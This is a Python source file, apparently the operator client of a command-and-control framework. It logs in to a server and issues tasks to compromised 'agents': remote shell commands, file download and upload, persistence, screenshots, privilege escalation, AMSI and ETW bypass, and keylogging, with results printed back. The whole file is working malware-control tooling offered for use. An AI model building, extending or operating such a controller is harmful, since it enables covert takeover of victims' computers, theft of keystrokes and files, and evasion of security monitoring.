#!/usr/bin/env python3
"""Remote operator CLI - connects to server's operator port with RBAC login."""
import socket, json, sys, getpass, base64, os
from common import recv_msg, send_msg


def send(sock, obj):
    send_msg(sock, json.dumps(obj).encode())


def recv(sock):
    raw = recv_msg(sock)
    return json.loads(raw) if raw else None


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5555
    sock = socket.socket()
    sock.connect((host, port))

    user = input("username: ").strip()
    pw = getpass.getpass("password: ")
    send(sock, {"cmd": "login", "username": user, "password": pw})
    r = recv(sock)
    if not r or r.get("status") != "ok":
        print(f"[!] login failed: {r}")
        return
    print(f"[+] Logged in as {r['username']} ({r['role']})")
    print("Type 'help' for commands.")

    cur_agent = None
    while True:
        try:
            tag = cur_agent[:8] if cur_agent else "none"
            line = input(f"[{r['username']}:{tag}] > ").strip()
            if not line:
                continue
            parts = line.split(maxsplit=3)
            name = parts[0].lower()
            if name == "exit":
                return
            cmd = {"cmd": name}
            if name == "help":
                print("list | use <id> | back | shell <cmd> | sysinfo | ps | env |\n"
                      "download <path> | upload <local> <remote> | persist <kind> |\n"
                      "screenshot | privesc | amsi | etw | keylog_start | keylog_dump |\n"
                      "keylog_stop | results | list_operators | add_operator <u> <p> <role> |\n"
                      "remove_operator <u> | list_profiles | exit")
                continue
            if name == "use":
                cmd["agent_id"] = parts[1] if len(parts) > 1 else ""
            elif name == "shell" and len(parts) > 1:
                cmd["command"] = line[len("shell "):]
            elif name == "download" and len(parts) > 1:
                cmd["path"] = parts[1]
            elif name == "upload" and len(parts) > 2:
                try:
                    with open(parts[1], "rb") as f:
                        cmd["content"] = base64.b64encode(f.read()).decode()
                    cmd["remote"] = parts[2]
                except Exception as e:
                    print(f"[!] {e}")
                    continue
            elif name == "persist" and len(parts) > 1:
                cmd["kind"] = parts[1]
            elif name == "add_operator" and len(parts) >= 3:
                cmd["username"] = parts[1]
                cmd["password"] = parts[2]
                cmd["role"] = parts[3] if len(parts) > 3 else "operator"
            elif name == "remove_operator" and len(parts) > 1:
                cmd["username"] = parts[1]

            send(sock, cmd)
            resp = recv(sock)
            if not resp:
                print("[!] disconnected")
                return
            if resp.get("status") == "error":
                print(f"[!] {resp.get('msg')}")
                continue
            if name == "use" and "agent_id" in resp:
                cur_agent = resp["agent_id"]
                print(f"[*] selected {cur_agent[:8]}")
            elif "agents" in resp:
                for a in resp["agents"]:
                    st = "alive" if a["connected"] else "dead"
                    print(f"{a['id'][:8]}  {st:5}  {a['hostname']:20}  "
                          f"{a['username']:15}  {a['os']:10}  {a['ip']}")
            elif "results" in resp:
                if not resp["results"]:
                    print("[*] no results")
                for rr in resp["results"]:
                    print(f"--- {rr['task_id'][:8]} ---")
                    print((rr["output"] or "")[:4000])
            elif "operators" in resp:
                for o in resp["operators"]:
                    print(f"  {o['username']:20} {o['role']}")
            elif "profiles" in resp:
                for p in resp["profiles"]:
                    print(f"  {p['name']:15} {p['register_uri']}")
            elif "task_id" in resp:
                print(f"[*] queued {resp['command']} ({resp['task_id'][:8]})")
            else:
                print(resp)
        except KeyboardInterrupt:
            print()
        except Exception as e:
            print(f"[!] {e}")
            return


if __name__ == "__main__":
    main()
